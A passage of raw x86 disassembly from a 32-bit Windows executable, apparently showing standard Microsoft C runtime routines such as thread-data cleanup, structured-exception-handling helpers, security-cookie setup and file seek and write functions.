  403877:	jne    0x403881
  403879:	push   0x10
  40387b:	call   0x402937
  403880:	pop    ecx
  403881:	mov    eax,esi
  403883:	pop    esi
  403884:	ret    
  403885:	push   0x8
  403887:	push   0x40c7d0
  40388c:	call   0x403b74
  403891:	mov    esi,DWORD PTR [ebp+0x8]
  403894:	test   esi,esi
  403896:	je     0x403994
  40389c:	mov    eax,DWORD PTR [esi+0x24]
  40389f:	test   eax,eax
  4038a1:	je     0x4038aa
  4038a3:	push   eax
  4038a4:	call   0x402682
  4038a9:	pop    ecx
  4038aa:	mov    eax,DWORD PTR [esi+0x2c]
  4038ad:	test   eax,eax
  4038af:	je     0x4038b8
  4038b1:	push   eax
  4038b2:	call   0x402682
  4038b7:	pop    ecx
  4038b8:	mov    eax,DWORD PTR [esi+0x34]
  4038bb:	test   eax,eax
  4038bd:	je     0x4038c6
  4038bf:	push   eax
  4038c0:	call   0x402682
  4038c5:	pop    ecx
  4038c6:	mov    eax,DWORD PTR [esi+0x3c]
  4038c9:	test   eax,eax
  4038cb:	je     0x4038d4
  4038cd:	push   eax
  4038ce:	call   0x402682
  4038d3:	pop    ecx
  4038d4:	mov    eax,DWORD PTR [esi+0x40]
  4038d7:	test   eax,eax
  4038d9:	je     0x4038e2
  4038db:	push   eax
  4038dc:	call   0x402682
  4038e1:	pop    ecx
  4038e2:	mov    eax,DWORD PTR [esi+0x44]
  4038e5:	test   eax,eax
  4038e7:	je     0x4038f0
  4038e9:	push   eax
  4038ea:	call   0x402682
  4038ef:	pop    ecx
  4038f0:	mov    eax,DWORD PTR [esi+0x48]
  4038f3:	test   eax,eax
  4038f5:	je     0x4038fe
  4038f7:	push   eax
  4038f8:	call   0x402682
  4038fd:	pop    ecx
  4038fe:	mov    eax,DWORD PTR [esi+0x5c]
  403901:	cmp    eax,0x40b878
  403906:	je     0x40390f
  403908:	push   eax
  403909:	call   0x402682
  40390e:	pop    ecx
  40390f:	push   0xd
  403911:	call   0x4066fe
  403916:	pop    ecx
  403917:	and    DWORD PTR [ebp-0x4],0x0
  40391b:	mov    edi,DWORD PTR [esi+0x68]
  40391e:	test   edi,edi
  403920:	je     0x40393c
  403922:	push   edi
  403923:	call   DWORD PTR ds:0x40b104
  403929:	test   eax,eax
  40392b:	jne    0x40393c
  40392d:	cmp    edi,0x40e520
  403933:	je     0x40393c
  403935:	push   edi
  403936:	call   0x402682
  40393b:	pop    ecx
  40393c:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  403943:	call   0x40399f
  403948:	push   0xc
  40394a:	call   0x4066fe
  40394f:	pop    ecx
  403950:	mov    DWORD PTR [ebp-0x4],0x1
  403957:	mov    edi,DWORD PTR [esi+0x6c]
  40395a:	test   edi,edi
  40395c:	je     0x403981
  40395e:	push   edi
  40395f:	call   0x4052f9
  403964:	pop    ecx
  403965:	cmp    edi,DWORD PTR ds:0x40eb28
  40396b:	je     0x403981
  40396d:	cmp    edi,0x40ea50
  403973:	je     0x403981
  403975:	cmp    DWORD PTR [edi],0x0
  403978:	jne    0x403981
  40397a:	push   edi
  40397b:	call   0x405121
  403980:	pop    ecx
  403981:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  403988:	call   0x4039ab
  40398d:	push   esi
  40398e:	call   0x402682
  403993:	pop    ecx
  403994:	call   0x403bb9
  403999:	ret    0x4
  40399c:	mov    esi,DWORD PTR [ebp+0x8]
  40399f:	push   0xd
  4039a1:	call   0x406624
  4039a6:	pop    ecx
  4039a7:	ret    
  4039a8:	mov    esi,DWORD PTR [ebp+0x8]
  4039ab:	push   0xc
  4039ad:	call   0x406624
  4039b2:	pop    ecx
  4039b3:	ret    
  4039b4:	mov    edi,edi
  4039b6:	push   esi
  4039b7:	push   edi
  4039b8:	mov    esi,0x40b900
  4039bd:	push   esi
  4039be:	call   DWORD PTR ds:0x40b0b8
  4039c4:	test   eax,eax
  4039c6:	jne    0x4039cf
  4039c8:	push   esi
  4039c9:	call   0x402907
  4039ce:	pop    ecx
  4039cf:	mov    edi,eax
  4039d1:	test   edi,edi
  4039d3:	je     0x403b37
  4039d9:	mov    esi,DWORD PTR ds:0x40b084
  4039df:	push   0x40b94c
  4039e4:	push   edi
  4039e5:	call   esi
  4039e7:	push   0x40b940
  4039ec:	push   edi
  4039ed:	mov    ds:0x40f7a4,eax
  4039f2:	call   esi
  4039f4:	push   0x40b934
  4039f9:	push   edi
  4039fa:	mov    ds:0x40f7a8,eax
  4039ff:	call   esi
  403a01:	push   0x40b92c
  403a06:	push   edi
  403a07:	mov    ds:0x40f7ac,eax
  403a0c:	call   esi
  403a0e:	cmp    DWORD PTR ds:0x40f7a4,0x0
  403a15:	mov    esi,DWORD PTR ds:0x40b0f0
  403a1b:	mov    ds:0x40f7b0,eax
  403a20:	je     0x403a38
  403a22:	cmp    DWORD PTR ds:0x40f7a8,0x0
  403a29:	je     0x403a38
  403a2b:	cmp    DWORD PTR ds:0x40f7ac,0x0
  403a32:	je     0x403a38
  403a34:	test   eax,eax
  403a36:	jne    0x403a5c
  403a38:	mov    eax,ds:0x40b0e8
  403a3d:	mov    ds:0x40f7a8,eax
  403a42:	mov    eax,ds:0x40b0f4
  403a47:	mov    DWORD PTR ds:0x40f7a4,0x403691
  403a51:	mov    DWORD PTR ds:0x40f7ac,esi
  403a57:	mov    ds:0x40f7b0,eax
  403a5c:	call   DWORD PTR ds:0x40b0ec
  403a62:	mov    ds:0x40e294,eax
  403a67:	cmp    eax,0xffffffff
  403a6a:	je     0x403b3c
  403a70:	push   DWORD PTR ds:0x40f7a8
  403a76:	push   eax
  403a77:	call   esi
  403a79:	test   eax,eax
  403a7b:	je     0x403b3c
  403a81:	call   0x402bf1
  403a86:	push   DWORD PTR ds:0x40f7a4
  403a8c:	call   0x4035a4
  403a91:	push   DWORD PTR ds:0x40f7a8
  403a97:	mov    ds:0x40f7a4,eax
  403a9c:	call   0x4035a4
  403aa1:	push   DWORD PTR ds:0x40f7ac
  403aa7:	mov    ds:0x40f7a8,eax
  403aac:	call   0x4035a4
  403ab1:	push   DWORD PTR ds:0x40f7b0
  403ab7:	mov    ds:0x40f7ac,eax
  403abc:	call   0x4035a4
  403ac1:	add    esp,0x10
  403ac4:	mov    ds:0x40f7b0,eax
  403ac9:	call   0x406582
  403ace:	test   eax,eax
  403ad0:	je     0x403b37
  403ad2:	push   0x403885
  403ad7:	push   DWORD PTR ds:0x40f7a4
  403add:	call   0x40361f
  403ae2:	pop    ecx
  403ae3:	call   eax
  403ae5:	mov    ds:0x40e290,eax
  403aea:	cmp    eax,0xffffffff
  403aed:	je     0x403b37
  403aef:	push   0x214
  403af4:	push   0x1
  403af6:	call   0x40281d
  403afb:	mov    esi,eax
  403afd:	pop    ecx
  403afe:	pop    ecx
  403aff:	test   esi,esi
  403b01:	je     0x403b37
  403b03:	push   esi
  403b04:	push   DWORD PTR ds:0x40e290
  403b0a:	push   DWORD PTR ds:0x40f7ac
  403b10:	call   0x40361f
  403b15:	pop    ecx
  403b16:	call   eax
  403b18:	test   eax,eax
  403b1a:	je     0x403b37
  403b1c:	push   0x0
  403b1e:	push   esi
  403b1f:	call   0x40370b
  403b24:	pop    ecx
  403b25:	pop    ecx
  403b26:	call   DWORD PTR ds:0x40b100
  403b2c:	or     DWORD PTR [esi+0x4],0xffffffff
  403b30:	mov    DWORD PTR [esi],eax
  403b32:	xor    eax,eax
  403b34:	inc    eax
  403b35:	jmp    0x403b3e
  403b37:	call   0x4036ce
  403b3c:	xor    eax,eax
  403b3e:	pop    edi
  403b3f:	pop    esi
  403b40:	ret    
  403b41:	mov    edi,edi
  403b43:	push   ebp
  403b44:	mov    ebp,esp
  403b46:	xor    eax,eax
  403b48:	cmp    DWORD PTR [ebp+0x8],eax
  403b4b:	push   0x0
  403b4d:	sete   al
  403b50:	push   0x1000
  403b55:	push   eax
  403b56:	call   DWORD PTR ds:0x40b108
  403b5c:	mov    ds:0x40f7b4,eax
  403b61:	test   eax,eax
  403b63:	jne    0x403b67
  403b65:	pop    ebp
  403b66:	ret    
  403b67:	xor    eax,eax
  403b69:	inc    eax
  403b6a:	mov    ds:0x41244c,eax
  403b6f:	pop    ebp
  403b70:	ret    
  403b71:	int3   
  403b72:	int3   
  403b73:	int3   
  403b74:	push   0x403bd0
  403b79:	push   DWORD PTR fs:0x0
  403b80:	mov    eax,DWORD PTR [esp+0x10]
  403b84:	mov    DWORD PTR [esp+0x10],ebp
  403b88:	lea    ebp,[esp+0x10]
  403b8c:	sub    esp,eax
  403b8e:	push   ebx
  403b8f:	push   esi
  403b90:	push   edi
  403b91:	mov    eax,ds:0x40e004
  403b96:	xor    DWORD PTR [ebp-0x4],eax
  403b99:	xor    eax,ebp
  403b9b:	push   eax
  403b9c:	mov    DWORD PTR [ebp-0x18],esp
  403b9f:	push   DWORD PTR [ebp-0x8]
  403ba2:	mov    eax,DWORD PTR [ebp-0x4]
  403ba5:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  403bac:	mov    DWORD PTR [ebp-0x8],eax
  403baf:	lea    eax,[ebp-0x10]
  403bb2:	mov    fs:0x0,eax
  403bb8:	ret    
  403bb9:	mov    ecx,DWORD PTR [ebp-0x10]
  403bbc:	mov    DWORD PTR fs:0x0,ecx
  403bc3:	pop    ecx
  403bc4:	pop    edi
  403bc5:	pop    edi
  403bc6:	pop    esi
  403bc7:	pop    ebx
  403bc8:	mov    esp,ebp
  403bca:	pop    ebp
  403bcb:	push   ecx
  403bcc:	ret    
  403bcd:	int3   
  403bce:	int3   
  403bcf:	int3   
  403bd0:	mov    edi,edi
  403bd2:	push   ebp
  403bd3:	mov    ebp,esp
  403bd5:	sub    esp,0x18
  403bd8:	push   ebx
  403bd9:	mov    ebx,DWORD PTR [ebp+0xc]
  403bdc:	push   esi
  403bdd:	mov    esi,DWORD PTR [ebx+0x8]
  403be0:	xor    esi,DWORD PTR ds:0x40e004
  403be6:	push   edi
  403be7:	mov    eax,DWORD PTR [esi]
  403be9:	mov    BYTE PTR [ebp-0x1],0x0
  403bed:	mov    DWORD PTR [ebp-0xc],0x1
  403bf4:	lea    edi,[ebx+0x10]
  403bf7:	cmp    eax,0xfffffffe
  403bfa:	je     0x403c09
  403bfc:	mov    ecx,DWORD PTR [esi+0x4]
  403bff:	add    ecx,edi
  403c01:	xor    ecx,DWORD PTR [eax+edi*1]
  403c04:	call   0x401d11
  403c09:	mov    ecx,DWORD PTR [esi+0xc]
  403c0c:	mov    eax,DWORD PTR [esi+0x8]
  403c0f:	add    ecx,edi
  403c11:	xor    ecx,DWORD PTR [eax+edi*1]
  403c14:	call   0x401d11
  403c19:	mov    eax,DWORD PTR [ebp+0x8]
  403c1c:	test   BYTE PTR [eax+0x4],0x66
  403c20:	jne    0x403d3c
  403c26:	mov    ecx,DWORD PTR [ebp+0x10]
  403c29:	lea    edx,[ebp-0x18]
  403c2c:	mov    DWORD PTR [ebx-0x4],edx
  403c2f:	mov    ebx,DWORD PTR [ebx+0xc]
  403c32:	mov    DWORD PTR [ebp-0x18],eax
  403c35:	mov    DWORD PTR [ebp-0x14],ecx
  403c38:	cmp    ebx,0xfffffffe
  403c3b:	je     0x403c9c
  403c3d:	lea    ecx,[ecx+0x0]
  403c40:	lea    eax,[ebx+ebx*2]
  403c43:	mov    ecx,DWORD PTR [esi+eax*4+0x14]
  403c47:	lea    eax,[esi+eax*4+0x10]
  403c4b:	mov    DWORD PTR [ebp-0x10],eax
  403c4e:	mov    eax,DWORD PTR [eax]
  403c50:	mov    DWORD PTR [ebp-0x8],eax
  403c53:	test   ecx,ecx
  403c55:	je     0x403c6b
  403c57:	mov    edx,edi
  403c59:	call   0x40851a
  403c5e:	mov    BYTE PTR [ebp-0x1],0x1
  403c62:	test   eax,eax
  403c64:	jl     0x403ca6
  403c66:	jg     0x403caf
  403c68:	mov    eax,DWORD PTR [ebp-0x8]
  403c6b:	mov    ebx,eax
  403c6d:	cmp    eax,0xfffffffe
  403c70:	jne    0x403c40
  403c72:	cmp    BYTE PTR [ebp-0x1],0x0
  403c76:	je     0x403c9c
  403c78:	mov    eax,DWORD PTR [esi]
  403c7a:	cmp    eax,0xfffffffe
  403c7d:	je     0x403c8c
  403c7f:	mov    ecx,DWORD PTR [esi+0x4]
  403c82:	add    ecx,edi
  403c84:	xor    ecx,DWORD PTR [eax+edi*1]
  403c87:	call   0x401d11
  403c8c:	mov    ecx,DWORD PTR [esi+0xc]
  403c8f:	mov    edx,DWORD PTR [esi+0x8]
  403c92:	add    ecx,edi
  403c94:	xor    ecx,DWORD PTR [edx+edi*1]
  403c97:	call   0x401d11
  403c9c:	mov    eax,DWORD PTR [ebp-0xc]
  403c9f:	pop    edi
  403ca0:	pop    esi
  403ca1:	pop    ebx
  403ca2:	mov    esp,ebp
  403ca4:	pop    ebp
  403ca5:	ret    
  403ca6:	mov    DWORD PTR [ebp-0xc],0x0
  403cad:	jmp    0x403c78
  403caf:	mov    ecx,DWORD PTR [ebp+0x8]
  403cb2:	cmp    DWORD PTR [ecx],0xe06d7363
  403cb8:	jne    0x403ce3
  403cba:	cmp    DWORD PTR ds:0x412448,0x0
  403cc1:	je     0x403ce3
  403cc3:	push   0x412448
  403cc8:	call   0x407950
  403ccd:	add    esp,0x4
  403cd0:	test   eax,eax
  403cd2:	je     0x403ce3
  403cd4:	mov    edx,DWORD PTR [ebp+0x8]
  403cd7:	push   0x1
  403cd9:	push   edx
  403cda:	call   DWORD PTR ds:0x412448
  403ce0:	add    esp,0x8
  403ce3:	mov    ecx,DWORD PTR [ebp+0xc]
  403ce6:	call   0x40854a
  403ceb:	mov    eax,DWORD PTR [ebp+0xc]
  403cee:	cmp    DWORD PTR [eax+0xc],ebx
  403cf1:	je     0x403d05
  403cf3:	push   0x40e004
  403cf8:	push   edi
  403cf9:	mov    edx,ebx
  403cfb:	mov    ecx,eax
  403cfd:	call   0x408564
  403d02:	mov    eax,DWORD PTR [ebp+0xc]
  403d05:	mov    ecx,DWORD PTR [ebp-0x8]
  403d08:	mov    DWORD PTR [eax+0xc],ecx
  403d0b:	mov    eax,DWORD PTR [esi]
  403d0d:	cmp    eax,0xfffffffe
  403d10:	je     0x403d1f
  403d12:	mov    ecx,DWORD PTR [esi+0x4]
  403d15:	add    ecx,edi
  403d17:	xor    ecx,DWORD PTR [eax+edi*1]
  403d1a:	call   0x401d11
  403d1f:	mov    ecx,DWORD PTR [esi+0xc]
  403d22:	mov    edx,DWORD PTR [esi+0x8]
  403d25:	add    ecx,edi
  403d27:	xor    ecx,DWORD PTR [edx+edi*1]
  403d2a:	call   0x401d11
  403d2f:	mov    eax,DWORD PTR [ebp-0x10]
  403d32:	mov    ecx,DWORD PTR [eax+0x8]
  403d35:	mov    edx,edi
  403d37:	call   0x408531
  403d3c:	mov    edx,0xfffffffe
  403d41:	cmp    DWORD PTR [ebx+0xc],edx
  403d44:	je     0x403c9c
  403d4a:	push   0x40e004
  403d4f:	push   edi
  403d50:	mov    ecx,ebx
  403d52:	call   0x408564
  403d57:	jmp    0x403c78
  403d5c:	mov    edi,edi
  403d5e:	push   ebp
  403d5f:	mov    ebp,esp
  403d61:	sub    esp,0x10
  403d64:	mov    eax,ds:0x40e004
  403d69:	and    DWORD PTR [ebp-0x8],0x0
  403d6d:	and    DWORD PTR [ebp-0x4],0x0
  403d71:	push   ebx
  403d72:	push   edi
  403d73:	mov    edi,0xbb40e64e
  403d78:	mov    ebx,0xffff0000
  403d7d:	cmp    eax,edi
  403d7f:	je     0x403d8e
  403d81:	test   ebx,eax
  403d83:	je     0x403d8e
  403d85:	not    eax
  403d87:	mov    ds:0x40e008,eax
  403d8c:	jmp    0x403dee
  403d8e:	push   esi
  403d8f:	lea    eax,[ebp-0x8]
  403d92:	push   eax
  403d93:	call   DWORD PTR ds:0x40b11c
  403d99:	mov    esi,DWORD PTR [ebp-0x4]
  403d9c:	xor    esi,DWORD PTR [ebp-0x8]
  403d9f:	call   DWORD PTR ds:0x40b118
  403da5:	xor    esi,eax
  403da7:	call   DWORD PTR ds:0x40b100
  403dad:	xor    esi,eax
  403daf:	call   DWORD PTR ds:0x40b114
  403db5:	xor    esi,eax
  403db7:	lea    eax,[ebp-0x10]
  403dba:	push   eax
  403dbb:	call   DWORD PTR ds:0x40b110
  403dc1:	mov    eax,DWORD PTR [ebp-0xc]
  403dc4:	xor    eax,DWORD PTR [ebp-0x10]
  403dc7:	xor    esi,eax
  403dc9:	cmp    esi,edi
  403dcb:	jne    0x403dd4
  403dcd:	mov    esi,0xbb40e64f
  403dd2:	jmp    0x403ddf
  403dd4:	test   ebx,esi
  403dd6:	jne    0x403ddf
  403dd8:	mov    eax,esi
  403dda:	shl    eax,0x10
  403ddd:	or     esi,eax
  403ddf:	mov    DWORD PTR ds:0x40e004,esi
  403de5:	not    esi
  403de7:	mov    DWORD PTR ds:0x40e008,esi
  403ded:	pop    esi
  403dee:	pop    edi
  403def:	pop    ebx
  403df0:	leave  
  403df1:	ret    
  403df2:	and    DWORD PTR ds:0x412444,0x0
  403df9:	ret    
  403dfa:	mov    edi,edi
  403dfc:	push   ebp
  403dfd:	mov    ebp,esp
  403dff:	push   ecx
  403e00:	push   ecx
  403e01:	mov    eax,DWORD PTR [ebp+0xc]
  403e04:	push   esi
  403e05:	mov    esi,DWORD PTR [ebp+0x8]
  403e08:	mov    DWORD PTR [ebp-0x8],eax
  403e0b:	mov    eax,DWORD PTR [ebp+0x10]
  403e0e:	push   edi
  403e0f:	push   esi
  403e10:	mov    DWORD PTR [ebp-0x4],eax
  403e13:	call   0x408601
  403e18:	or     edi,0xffffffff
  403e1b:	pop    ecx
  403e1c:	cmp    eax,edi
  403e1e:	jne    0x403e31
  403e20:	call   0x4024b6
  403e25:	mov    DWORD PTR [eax],0x9
  403e2b:	mov    eax,edi
  403e2d:	mov    edx,edi
  403e2f:	jmp    0x403e7b
  403e31:	push   DWORD PTR [ebp+0x14]
  403e34:	lea    ecx,[ebp-0x4]
  403e37:	push   ecx
  403e38:	push   DWORD PTR [ebp-0x8]
  403e3b:	push   eax
  403e3c:	call   DWORD PTR ds:0x40b120
  403e42:	mov    DWORD PTR [ebp-0x8],eax
  403e45:	cmp    eax,edi
  403e47:	jne    0x403e5c
  403e49:	call   DWORD PTR ds:0x40b08c
  403e4f:	test   eax,eax
  403e51:	je     0x403e5c
  403e53:	push   eax
  403e54:	call   0x4024dc
  403e59:	pop    ecx
  403e5a:	jmp    0x403e2b
  403e5c:	mov    eax,esi
  403e5e:	sar    eax,0x5
  403e61:	mov    eax,DWORD PTR [eax*4+0x412460]
  403e68:	and    esi,0x1f
  403e6b:	shl    esi,0x6
  403e6e:	lea    eax,[eax+esi*1+0x4]
  403e72:	and    BYTE PTR [eax],0xfd
  403e75:	mov    eax,DWORD PTR [ebp-0x8]
  403e78:	mov    edx,DWORD PTR [ebp-0x4]
  403e7b:	pop    edi
  403e7c:	pop    esi
  403e7d:	leave  
  403e7e:	ret    
  403e7f:	push   0x14
  403e81:	push   0x40c7f8
  403e86:	call   0x403b74
  403e8b:	or     esi,0xffffffff
  403e8e:	mov    DWORD PTR [ebp-0x24],esi
  403e91:	mov    DWORD PTR [ebp-0x20],esi
  403e94:	mov    eax,DWORD PTR [ebp+0x8]
  403e97:	cmp    eax,0xfffffffe
  403e9a:	jne    0x403eb8
  403e9c:	call   0x4024c9
  403ea1:	and    DWORD PTR [eax],0x0
  403ea4:	call   0x4024b6
  403ea9:	mov    DWORD PTR [eax],0x9
  403eaf:	mov    eax,esi
  403eb1:	mov    edx,esi
  403eb3:	jmp    0x403f88
  403eb8:	xor    edi,edi
  403eba:	cmp    eax,edi
  403ebc:	jl     0x403ec6
  403ebe:	cmp    eax,DWORD PTR ds:0x412450
  403ec4:	jb     0x403ee7
  403ec6:	call   0x4024c9
  403ecb:	mov    DWORD PTR [eax],edi
  403ecd:	call   0x4024b6
  403ed2:	mov    DWORD PTR [eax],0x9
  403ed8:	push   edi
  403ed9:	push   edi
  403eda:	push   edi
  403edb:	push   edi
  403edc:	push   edi
  403edd:	call   0x40244e
  403ee2:	add    esp,0x14
  403ee5:	jmp    0x403eaf
  403ee7:	mov    ecx,eax
  403ee9:	sar    ecx,0x5
  403eec:	lea    ebx,[ecx*4+0x412460]
  403ef3:	mov    esi,eax
  403ef5:	and    esi,0x1f
  403ef8:	shl    esi,0x6
  403efb:	mov    ecx,DWORD PTR [ebx]
  403efd:	movsx  ecx,BYTE PTR [ecx+esi*1+0x4]
  403f02:	and    ecx,0x1
  403f05:	jne    0x403f2d
  403f07:	call   0x4024c9
  403f0c:	mov    DWORD PTR [eax],edi
  403f0e:	call   0x4024b6
  403f13:	mov    DWORD PTR [eax],0x9
  403f19:	push   edi
  403f1a:	push   edi
  403f1b:	push   edi
  403f1c:	push   edi
  403f1d:	push   edi
  403f1e:	call   0x40244e
  403f23:	add    esp,0x14
  403f26:	or     edx,0xffffffff
  403f29:	mov    eax,edx
  403f2b:	jmp    0x403f88
  403f2d:	push   eax
  403f2e:	call   0x408678
  403f33:	pop    ecx
  403f34:	mov    DWORD PTR [ebp-0x4],edi
  403f37:	mov    eax,DWORD PTR [ebx]
  403f39:	test   BYTE PTR [eax+esi*1+0x4],0x1
  403f3e:	je     0x403f5c
  403f40:	push   DWORD PTR [ebp+0x14]
  403f43:	push   DWORD PTR [ebp+0x10]
  403f46:	push   DWORD PTR [ebp+0xc]
  403f49:	push   DWORD PTR [ebp+0x8]
  403f4c:	call   0x403dfa
  403f51:	add    esp,0x10
  403f54:	mov    DWORD PTR [ebp-0x24],eax
  403f57:	mov    DWORD PTR [ebp-0x20],edx
  403f5a:	jmp    0x403f76
  403f5c:	call   0x4024b6
  403f61:	mov    DWORD PTR [eax],0x9
  403f67:	call   0x4024c9
  403f6c:	mov    DWORD PTR [eax],edi
  403f6e:	or     DWORD PTR [ebp-0x24],0xffffffff
  403f72:	or     DWORD PTR [ebp-0x20],0xffffffff
  403f76:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  403f7d:	call   0x403f8e
  403f82:	mov    eax,DWORD PTR [ebp-0x24]
  403f85:	mov    edx,DWORD PTR [ebp-0x20]
  403f88:	call   0x403bb9
  403f8d:	ret    
  403f8e:	push   DWORD PTR [ebp+0x8]
  403f91:	call   0x408718
  403f96:	pop    ecx
  403f97:	ret    
  403f98:	mov    edi,edi
  403f9a:	push   ebp
  403f9b:	mov    ebp,esp
  403f9d:	mov    eax,0x1ae4
  403fa2:	call   0x408810
  403fa7:	mov    eax,ds:0x40e004
  403fac:	xor    eax,ebp
  403fae:	mov    DWORD PTR [ebp-0x4],eax
  403fb1:	mov    eax,DWORD PTR [ebp+0xc]
  403fb4:	push   esi
  403fb5:	xor    esi,esi
  403fb7:	mov    DWORD PTR [ebp-0x1acc],eax
  403fbd:	mov    DWORD PTR [ebp-0x1ac8],esi
  403fc3:	mov    DWORD PTR [ebp-0x1ad0],esi
  403fc9:	cmp    DWORD PTR [ebp+0x10],esi
  403fcc:	jne    0x403fd5
  403fce:	xor    eax,eax
  403fd0:	jmp    0x4046be
  403fd5:	cmp    eax,esi
  403fd7:	jne    0x404000
  403fd9:	call   0x4024c9
  403fde:	mov    DWORD PTR [eax],esi
  403fe0:	call   0x4024b6
  403fe5:	push   esi
  403fe6:	push   esi
  403fe7:	push   esi
  403fe8:	push   esi
  403fe9:	push   esi
  403fea:	mov    DWORD PTR [eax],0x16
  403ff0:	call   0x40244e
  403ff5:	add    esp,0x14
  403ff8:	or     eax,0xffffffff
  403ffb:	jmp    0x4046be
  404000:	push   ebx
  404001:	push   edi
  404002:	mov    edi,DWORD PTR [ebp+0x8]
  404005:	mov    eax,edi
  404007:	sar    eax,0x5
  40400a:	lea    esi,[eax*4+0x412460]
  404011:	mov    eax,DWORD PTR [esi]
  404013:	and    edi,0x1f
  404016:	shl    edi,0x6
  404019:	add    eax,edi
  40401b:	mov    bl,BYTE PTR [eax+0x24]
  40401e:	add    bl,bl
  404020:	sar    bl,1
  404022:	mov    DWORD PTR [ebp-0x1ad8],esi
  404028:	mov    BYTE PTR [ebp-0x1ad9],bl
  40402e:	cmp    bl,0x2
  404031:	je     0x404038
  404033:	cmp    bl,0x1
  404036:	jne    0x404068
  404038:	mov    ecx,DWORD PTR [ebp+0x10]
  40403b:	not    ecx
  40403d:	test   cl,0x1
  404040:	jne    0x404068
  404042:	call   0x4024c9
  404047:	xor    esi,esi
  404049:	mov    DWORD PTR [eax],esi
  40404b:	call   0x4024b6
  404050:	push   esi
  404051:	push   esi
  404052:	push   esi
  404053:	push   esi
  404054:	push   esi
  404055:	mov    DWORD PTR [eax],0x16
  40405b:	call   0x40244e
  404060:	add    esp,0x14
  404063:	jmp    0x4046ab
  404068:	test   BYTE PTR [eax+0x4],0x20
  40406c:	je     0x40407f
  40406e:	push   0x2
  404070:	push   0x0
  404072:	push   0x0
  404074:	push   DWORD PTR [ebp+0x8]
  404077:	call   0x403dfa
  40407c:	add    esp,0x10
  40407f:	push   DWORD PTR [ebp+0x8]
  404082:	call   0x4047f0
  404087:	pop    ecx
  404088:	test   eax,eax
  40408a:	je     0x40432d
  404090:	mov    eax,DWORD PTR [esi]
  404092:	test   BYTE PTR [edi+eax*1+0x4],0x80
  404097:	je     0x40432d
  40409d:	call   0x40386b
  4040a2:	mov    eax,DWORD PTR [eax+0x6c]
  4040a5:	xor    ecx,ecx
  4040a7:	cmp    DWORD PTR [eax+0x14],ecx
  4040aa:	lea    eax,[ebp-0x1ae4]
  4040b0:	sete   cl
  4040b3:	push   eax
  4040b4:	mov    eax,DWORD PTR [esi]
  4040b6:	push   DWORD PTR [edi+eax*1]
  4040b9:	mov    DWORD PTR [ebp-0x1ae0],ecx
  4040bf:	call   DWORD PTR ds:0x40b12c
  4040c5:	test   eax,eax
  4040c7:	je     0x40432d
  4040cd:	xor    ecx,ecx
  4040cf:	cmp    DWORD PTR [ebp-0x1ae0],ecx
  4040d5:	je     0x4040df
  4040d7:	test   bl,bl
  4040d9:	je     0x40432f
  4040df:	call   DWORD PTR ds:0x40b128
  4040e5:	mov    ebx,DWORD PTR [ebp-0x1acc]
  4040eb:	mov    DWORD PTR [ebp-0x1ae4],eax
  4040f1:	xor    eax,eax
  4040f3:	mov    DWORD PTR [ebp-0x1ac4],eax
  4040f9:	cmp    DWORD PTR [ebp+0x10],eax
  4040fc:	jbe    0x404644
  404102:	mov    DWORD PTR [ebp-0x1abc],eax
  404108:	mov    al,BYTE PTR [ebp-0x1ad9]
  40410e:	test   al,al
  404110:	jne    0x40427d
  404116:	mov    cl,BYTE PTR [ebx]
  404118:	mov    esi,DWORD PTR [ebp-0x1ad8]
  40411e:	xor    eax,eax
  404120:	cmp    cl,0xa
  404123:	sete   al
  404126:	mov    DWORD PTR [ebp-0x1ae0],eax
  40412c:	mov    eax,DWORD PTR [esi]
  40412e:	add    eax,edi
  404130:	cmp    DWORD PTR [eax+0x38],0x0
  404134:	je     0x40414b
  404136:	mov    dl,BYTE PTR [eax+0x34]
  404139:	mov    BYTE PTR [ebp-0xc],dl
  40413c:	mov    BYTE PTR [ebp-0xb],cl
  40413f:	and    DWORD PTR [eax+0x38],0x0
  404143:	push   0x2
  404145:	lea    eax,[ebp-0xc]
  404148:	push   eax
  404149:	jmp    0x404196
  40414b:	movsx  eax,cl
  40414e:	push   eax
  40414f:	call   0x405804
  404154:	pop    ecx
  404155:	test   eax,eax
  404157:	je     0x404193
  404159:	mov    ecx,DWORD PTR [ebp-0x1acc]
  40415f:	sub    ecx,ebx
  404161:	add    ecx,DWORD PTR [ebp+0x10]
  404164:	xor    eax,eax
  404166:	inc    eax
  404167:	cmp    ecx,eax
  404169:	jbe    0x404314
  40416f:	push   0x2
  404171:	lea    eax,[ebp-0x1ac0]
  404177:	push   ebx
  404178:	push   eax
  404179:	call   0x4057b2
  40417e:	add    esp,0xc
  404181:	cmp    eax,0xffffffff
  404184:	je     0x40463b
  40418a:	inc    ebx
  40418b:	inc    DWORD PTR [ebp-0x1abc]
  404191:	jmp    0x4041ae
  404193:	push   0x1
  404195:	push   ebx
  404196:	lea    eax,[ebp-0x1ac0]
  40419c:	push   eax
  40419d:	call   0x4057b2
  4041a2:	add    esp,0xc
  4041a5:	cmp    eax,0xffffffff
  4041a8:	je     0x40463b
  4041ae:	xor    eax,eax
  4041b0:	push   eax
  4041b1:	push   eax
  4041b2:	push   0x5
  4041b4:	lea    ecx,[ebp-0xc]
  4041b7:	push   ecx
  4041b8:	push   0x1
  4041ba:	lea    ecx,[ebp-0x1ac0]
  4041c0:	push   ecx
  4041c1:	push   eax
  4041c2:	push   DWORD PTR [ebp-0x1ae4]
  4041c8:	inc    ebx
  4041c9:	inc    DWORD PTR [ebp-0x1abc]
  4041cf:	call   DWORD PTR ds:0x40b124
  4041d5:	mov    esi,eax
  4041d7:	test   esi,esi
  4041d9:	je     0x40463b
  4041df:	push   0x0
  4041e1:	lea    eax,[ebp-0x1ac4]
  4041e7:	push   eax
  4041e8:	push   esi
  4041e9:	lea    eax,[ebp-0xc]
  4041ec:	push   eax
  4041ed:	mov    eax,DWORD PTR [ebp-0x1ad8]
  4041f3:	mov    eax,DWORD PTR [eax]
  4041f5:	push   DWORD PTR [edi+eax*1]
  4041f8:	call   DWORD PTR ds:0x40b0c0
  4041fe:	test   eax,eax
  404200:	je     0x40462f
  404206:	mov    eax,DWORD PTR [ebp-0x1abc]
  40420c:	mov    ecx,DWORD PTR [ebp-0x1ad0]
  404212:	add    eax,ecx
  404214:	cmp    DWORD PTR [ebp-0x1ac4],esi
  40421a:	mov    DWORD PTR [ebp-0x1ac8],eax
  404220:	jl     0x40463b
  404226:	cmp    DWORD PTR [ebp-0x1ae0],0x0
  40422d:	je     0x404300
